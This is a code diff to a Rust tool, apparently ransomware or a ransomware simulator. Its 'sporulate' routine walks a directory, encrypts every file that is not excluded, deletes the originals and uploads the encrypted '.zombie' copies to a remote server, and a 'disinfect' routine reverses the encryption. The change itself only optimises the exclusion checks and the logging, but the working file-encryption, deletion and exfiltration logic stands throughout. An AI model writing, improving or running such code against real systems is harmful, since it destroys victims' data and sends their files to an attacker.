@@ -6,6 +6,7 @@ use std::{
     fs::{self, File},
     io::Write,
     path::Path,
+    sync::LazyLock,
 };
 
 use log::{debug, error, info};
@@ -53,6 +54,14 @@ const EXCLUDED_FILES: &[&str] = &[
     ".swo",
 ];
 
+/// Pre-computed HashSet for excluded directories - initialized once
+static EXCLUDED_DIRS_SET: LazyLock<HashSet<&'static str>> =
+    LazyLock::new(|| EXCLUDED_DIRS.iter().copied().collect());
+
+/// Pre-computed HashSet for excluded files - initialized once
+static EXCLUDED_FILES_SET: LazyLock<HashSet<&'static str>> =
+    LazyLock::new(|| EXCLUDED_FILES.iter().copied().collect());
+
 /// Walks a directory tree starting from `path`, excluding directories
 /// and files based on predefined lists, and encrypts and exfiltrates
 /// files. It's like a spores burst--sporulate.
@@ -88,9 +97,6 @@ pub async fn sporulate(
     let public_key = load_public_key(key)?;
     debug!("Loaded public key from {:?}", key);
 
-    let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
-    let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
-
     let client = Client::new();
     let mut has_errors = false;
 
@@ -104,7 +110,7 @@ pub async fn sporulate(
 
             if entry.file_type().is_dir()
                 && let Some(file_name) = file_name.to_str()
-                && excluded_dirs_set.contains(file_name)
+                && EXCLUDED_DIRS_SET.contains(file_name)
             {
                 debug!("Skipping folder {}", file_path.display());
                 return false;
@@ -113,16 +119,22 @@ pub async fn sporulate(
             if entry.file_type().is_file() {
                 let path = entry.path();
                 let file_name_str = path.file_name().and_then(|name| name.to_str());
-                let extension_str = path
-                    .extension()
-                    .and_then(|ext| ext.to_str())
-                    .map(|ext| format!(".{}", ext));
 
-                if file_name_str.is_some_and(|name| excluded_files_set.contains(name))
-                    || extension_str.is_some_and(|ext| excluded_files_set.contains(ext.as_str()))
-                {
+                // Check filename directly
+                if file_name_str.is_some_and(|name| EXCLUDED_FILES_SET.contains(name)) {
                     debug!("Skipping file {}", file_path.display());
                     return false;
+                }
+
+                // Check extension with optimized string handling
+                if let Some(ext_str) = path.extension().and_then(|ext| ext.to_str()) {
+                    let mut ext_with_dot = String::with_capacity(ext_str.len() + 1);
+                    ext_with_dot.push('.');
+                    ext_with_dot.push_str(ext_str);
+                    if EXCLUDED_FILES_SET.contains(ext_with_dot.as_str()) {
+                        debug!("Skipping file {}", file_path.display());
+                        return false;
+                    }
                 }
             }
             true
@@ -136,16 +148,22 @@ pub async fn sporulate(
         let file_path = entry.path();
 
         let process = || async {
-            debug!("Encrypting file: {:?}", file_path);
+            if log::log_enabled!(log::Level::Debug) {
+                debug!("Encrypting file: {:?}", file_path);
+            }
             let zombie = encrypt(file_path, &public_key)?;
 
             if !no_delete {
-                debug!("Deleting original file: {:?}", file_path);
+                if log::log_enabled!(log::Level::Debug) {
+                    debug!("Deleting original file: {:?}", file_path);
+                }
                 fs::remove_file(file_path)?;
             }
 
             if let Some(address) = server {
-                debug!("Exfiltrating file: {:?}", zombie);
+                if log::log_enabled!(log::Level::Debug) {
+                    debug!("Exfiltrating file: {:?}", zombie);
+                }
                 upload_file(&client, address, &zombie).await?;
             }
             Ok::<(), AppError>(())
@@ -202,11 +220,15 @@ pub fn disinfect(path: &Path, key: &Path, no_delete: bool) -> Result<(), AppErro
         let file_path = entry.path();
 
         let process = || -> Result<(), AppError> {
-            debug!("Decrypting file: {:?}", file_path);
+            if log::log_enabled!(log::Level::Debug) {
+                debug!("Decrypting file: {:?}", file_path);
+            }
             decrypt(file_path, &private_key)?;
 
             if !no_delete {
-                debug!("Deleting .zombie file: {:?}", file_path);
+                if log::log_enabled!(log::Level::Debug) {
+                    debug!("Deleting .zombie file: {:?}", file_path);
+                }
                 fs::remove_file(file_path)?;
             }
             Ok(())
